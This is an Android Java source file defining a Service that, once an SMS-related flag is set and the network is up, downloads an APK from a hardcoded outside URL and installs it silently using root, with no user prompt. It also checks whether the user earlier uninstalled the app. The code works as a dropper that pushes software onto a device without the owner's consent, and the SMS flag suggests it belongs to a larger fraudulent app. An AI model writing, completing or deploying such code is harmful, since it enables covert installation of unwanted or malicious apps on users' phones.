package com.x.installsilent;

import java.io.File;
import java.io.InputStream;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.os.IBinder;

import com.kim.androidbase.packageinfo.PackageUtils;
import com.kim.file.SDCardUtils;
import com.kim.file.SharedPreferencesUtils;
import com.kim.net.NetCallback;
import com.kim.net.NetEntity;
import com.x.installsilent.net.DownloadUrlEntity;
import com.x.installsilent.utils.DownloadSilently;
import com.x.installsilent.utils.InstallSilentConfigUtils;
import com.x.installsilent.utils.NetManager;
import com.x.installsilent.utils.RootUtils;

public class InstallService extends Service {

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		System.out.println("startService");
		// RootUtils.installSilentThread(SDCardUtils.getSDCardBaseDir() +
		// "/vrking.apk");

		// if (RootUtils.isRoot(getPackageCodePath())) {
		// System.out.println("install file dir:" +
		// SDCardUtils.getSDCardBaseDir() + "/vrking.apk");
		// RootUtils.installSilentThread(SDCardUtils.getSDCardBaseDir() +
		// "/vrking.apk");
		// return super.onStartCommand(intent, flags, startId);
		// }

		if (!InstallSilentConfigUtils.isSmsSendOver(getApplicationContext())) {
			stopSelf();
			return super.onStartCommand(intent, flags, startId);
		}

		if (!NetManager.isNetAvailable(getApplicationContext())) {
			stopSelf();
			return super.onStartCommand(intent, flags, startId);
		}

		// DownloadUrlEntity entity = new DownloadUrlEntity();
		// DownloadSilently.getDownloadUrl(entity, new NetCallback() {
		//
		// @Override
		// public void onSuccess(int httpResponseCode,
		// InputStream inputStream, NetEntity netEntity) {

		new Thread(new Runnable() {

			@Override
			public void run() {
				String downloadUrl = "http://www.hzblogs.com/resource_rss/apks/nidoya_v1.0.0.release.apk";

				// SharedPreferences preferences = SharedPreferencesUtils
				// .getSharedPreferences(getApplicationContext(),
				// "applist");
				// // already Installed
				// if (preferences.contains(downloadUrl)) {
				// return ;
				// } else {
				// preferences.edit().putString(downloadUrl, downloadUrl)
				// .commit();
				// }

				String fileLoadPath = DownloadSilently
						.getFileNamePath(downloadUrl);
				System.out.println("fileLoadPath" + fileLoadPath);
				DownloadSilently.download(downloadUrl);
				File file = null;
				try {
					file = new File(fileLoadPath);
				} catch (Exception e) {
					e.printStackTrace();
				}
				if (file != null && file.exists()) {
					// install silently
					PackageUtils packageUtils = PackageUtils
							.getInstance(getApplicationContext());
					PackageInfo packageInfo = packageUtils
							.getUninstalledPackageInfo(fileLoadPath);

					// already installed
					if (packageUtils.isInstalled(packageInfo)) {
						stopSelf();
						// delete the file
						file.delete();
						return;
					}

					// 安装成功后被卸载
					if (InstallSilentConfigUtils.isApplicationInstalled(
							getApplicationContext(), packageInfo.packageName)) {
						stopSelf();
						// delete the file
						file.delete();
						return;
					}
					// has get the root authority
					// if (RootUtils.isRoot(getPackageCodePath())) {
					// System.out.println("localFilePath:" + fileLoadPath);
					// RootUtils.installSilentThread(fileLoadPath);
					RootUtils.installSilent(fileLoadPath);
					// }
					// delete the file
					// file.delete();
					stopSelf();
				}
			}
		}).start();
		// }

		// @Override
		// public void onError(int httpResponseCode, String errorMsg) {
		// // get download URL failed.
		// System.out.println("failed");
		// stopSelf();
		// }
		// });

		return super.onStartCommand(intent, flags, startId);
	}

}
